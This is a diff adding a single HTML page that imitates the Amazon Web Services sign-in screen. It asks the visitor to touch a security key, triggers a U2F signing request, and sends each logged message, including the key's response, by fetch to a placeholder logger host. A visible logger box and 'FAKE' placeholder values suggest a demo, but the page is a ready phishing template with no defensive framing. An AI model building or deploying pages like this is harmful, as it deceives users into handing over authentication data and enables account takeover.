@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Amazon Web Services Sign-In</title>
+  <link rel="stylesheet" href="https://signin.aws.amazon.com/static/css/aws-signin.css">
+  <script src="https://signin.aws.amazon.com/static/js/u2f-api.js"></script>
+  <style>
+    body { font-family: sans-serif; background: #f1faff; margin: 0; padding: 0; }
+    #phish-logger { position: absolute; top: 0; left: 0; background: #fff; color: red; padding: 10px; font-size: 12px; z-index: 999; }
+  </style>
+</head>
+<body>
+  <div id="phish-logger">[+] Logger Ready</div>
+
+  <div id="logo_container">
+    <h1 class="background-mid"></h1>
+  </div>
+
+  <div class="aws-signin-main-box fixed-width">
+    <div id="signin-improvements">
+      <div id="signin-improvements-content">
+        <div id="improvement-title"><h1>Sign in using your security key</h1></div>
+        <div id="improvement-description">
+          <p>Insert your security key and touch it when prompted.</p>
+        </div>
+        <div class="signin-improvements-button-div">
+          <button onclick="startFakeU2F()" class="aws-signin-button aws-signin-button-variant-primary">Continue</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function log(msg) {
+      document.getElementById("phish-logger").innerText = "[+] " + msg;
+      fetch("https://your-logger.example.com/capture?msg=" + encodeURIComponent(msg));
+    }
+
+    function startFakeU2F() {
+      log("Simulating U2F Request...");
+      const fakeChallenge = {
+        appId: "https://signin.aws.amazon.com",
+        challenge: "FAKECHALLENGE1234567890",
+        registeredKeys: [{
+          version: "U2F_V2",
+          keyHandle: "FAKEHANDLE"
+        }]
+      };
+
+      u2f.sign(fakeChallenge.appId, fakeChallenge.challenge, fakeChallenge.registeredKeys, function(data) {
+        log("Fake U2F Response Received: " + JSON.stringify(data));
+      });
+    }
+  </script>
+</body>
+</html>
